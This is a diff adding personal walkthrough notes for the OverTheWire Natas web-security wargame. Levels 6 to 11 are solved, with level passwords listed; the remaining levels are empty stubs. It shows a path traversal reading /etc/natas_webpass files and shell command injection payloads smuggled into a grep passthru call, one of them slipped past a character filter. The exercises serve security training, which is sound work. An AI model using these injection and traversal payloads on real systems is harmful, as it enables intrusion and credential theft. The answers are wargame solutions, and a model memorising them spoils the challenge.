@@ -78,8 +78,297 @@ url: http://natas6.natas.labs.overthewire.org
 username: natas6
 password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
 solve:
+After I viewed the code showed after clicking view source code' I saw the line: include "includes/secret.inc";
+Which helped me to understand that the secret found on that file, so I entered:
+http://natas6.natas.labs.overthewire.org/includes/secret.inc
+And saw: "
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+"
+So I entered the secret to the input and got: "Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr "
+
+___________________________________________________________________________________________
+
+level 7
+url: http://natas7.natas.labs.overthewire.org 
+username: natas7
+password: jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+solve:
+I saw when I entered the home and about pages that in the url there are php query so I entered query that give me the page of the password :http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+And got:
+ Home About
+a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
 
 
+___________________________________________________________________________________________
+
+level 8
+url: http://natas8.natas.labs.overthewire.org 
+username: natas8
+password: a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+solve:
+I entered the source code and saw that the input need to be equal to the opposite func:
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+On the string " 3d3d516343746d4d6d6c315669563362 "
+
+So I create reversed function:
+<?php
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+function decodeSecret($secret){
+        return base64_decode(strrev(hex2bin($secret)));
+}
+print decodeSecret($encodedSecret)
+
+?>
+And got "oubWYf2kBq"
+I entered the string to the input and got:
+Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+
+___________________________________________________________________________________________
+
+level 9
+url: http://natas9.natas.labs.overthewire.org 
+username: natas9
+password: Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
+solve:
+I viewed the source code and saw that 
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+Which mean that I gan inject code to the string, so I injected the code: "abcd; cat /etc/natas_webpass/natas10"
+And now the code on the background looks like:
+if($key != "") {
+    passthru("grep -i abcd; cat /etc/natas_webpass/natas10 dictionary.txt");
+}
+And it activate the code "cat /etc/natas_webpass/natas10" to show mw the password:
+Output:
+D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+
+African
+Africans
+Allah
+.....
+
+
+
+___________________________________________________________________________________________
+
+level 10
+url: http://natas10.natas.labs.overthewire.org 
+username: natas10
+password: D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
+solve:
+As the last level we get source code but here they make illegal chars :     if(preg_match('/[;|&]/',$key))
+So I inject the code: " .* /etc/natas_webpass/natas11 # "
+And the func looks now like this: 
+passthru("grep -i .* /etc/natas_webpass/natas11 # dictionary.txt");
+And we get :
+Output:
+.htaccess:AuthType Basic
+.htaccess: AuthName "Authentication required"
+.htaccess: AuthUserFile /var/www/natas/natas10/.htpasswd
+.htaccess: require valid-user
+.htpasswd:natas10:$apr1$t6bjsq8a$xpGFjsUmCvTZohx70DGXg/
+/etc/natas_webpass/natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+
+___________________________________________________________________________________________
+
+level 11
+url: http://natas11.natas.labs.overthewire.org 
+username: natas11
+password: 1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg
+solve:
+
+___________________________________________________________________________________________
+
+level 12
+url: http://natas12.natas.labs.overthewire.org 
+username: natas12
+password: XXX
+solve:
+
+___________________________________________________________________________________________
+
+level 13
+url: http://natas13.natas.labs.overthewire.org 
+username: natas13
+password: XXX
+solve:
+
+___________________________________________________________________________________________
+
+level 14
+url: http://natas14.natas.labs.overthewire.org 
+username: natas14
+password: XXX
+solve:
+
+___________________________________________________________________________________________
+
+level 15
+url: http://natas15.natas.labs.overthewire.org 
+username: natas15
+password: XXX
+solve:
+
+___________________________________________________________________________________________
+
+level 16
+url: http://natas16.natas.labs.overthewire.org 
+username: natas16
+password: XXX
+solve:
+
+___________________________________________________________________________________________
+
+level 17
+url: http://natas17.natas.labs.overthewire.org 
+username: natas17
+password: XXX
+solve:
+
+___________________________________________________________________________________________
+
+level 18
+url: http://natas18.natas.labs.overthewire.org 
+username: natas18
+password: XXX
+solve:
+
+___________________________________________________________________________________________
+
+level 19
+url: http://natas19.natas.labs.overthewire.org 
+username: natas19
+password: XXX
+solve:
+
+___________________________________________________________________________________________
+
+level 20
+url: http://natas20.natas.labs.overthewire.org 
+username: natas20
+password: XXX
+solve:
+
+___________________________________________________________________________________________
+
+level 21
+url: http://natas21.natas.labs.overthewire.org 
+username: natas21
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 22
+url: http://natas22.natas.labs.overthewire.org 
+username: natas22
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 23
+url: http://natas23.natas.labs.overthewire.org 
+username: natas23
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 24
+url: http://natas24.natas.labs.overthewire.org 
+username: natas24
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 25
+url: http://natas25.natas.labs.overthewire.org 
+username: natas25
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 26
+url: http://natas26.natas.labs.overthewire.org 
+username: natas26
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 27
+url: http://natas27.natas.labs.overthewire.org 
+username: natas27
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 28
+url: http://natas28.natas.labs.overthewire.org 
+username: natas28
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 29
+url: http://natas29.natas.labs.overthewire.org 
+username: natas29
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 30
+url: http://natas30.natas.labs.overthewire.org 
+username: natas30
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 31
+url: http://natas31.natas.labs.overthewire.org 
+username: natas31
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 32
+url: http://natas32.natas.labs.overthewire.org 
+username: natas32
+password: XXX
+solve:
+
+
+___________________________________________________________________________________________
+
+level 33
+url: http://natas33.natas.labs.overthewire.org 
+username: natas33
+password: XXX
+solve:
 
 
 
